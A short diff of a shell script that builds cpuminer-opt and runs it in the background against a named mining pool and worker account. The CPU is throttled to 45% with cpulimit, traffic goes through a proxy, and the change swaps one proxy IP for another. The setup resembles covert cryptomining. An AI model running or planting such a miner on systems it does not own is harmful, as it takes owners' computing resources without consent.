@@ -5,5 +5,5 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 45 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://cryply.luckypool.org:9999 -u manlytq.180401 -p x -x socks5://108.61.229.6:6651 --background
+cpulimit --exe cpuminer --limit 45 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://cryply.luckypool.org:9999 -u manlytq.180401 -p x -x 45.63.57.158:1102 --background
 
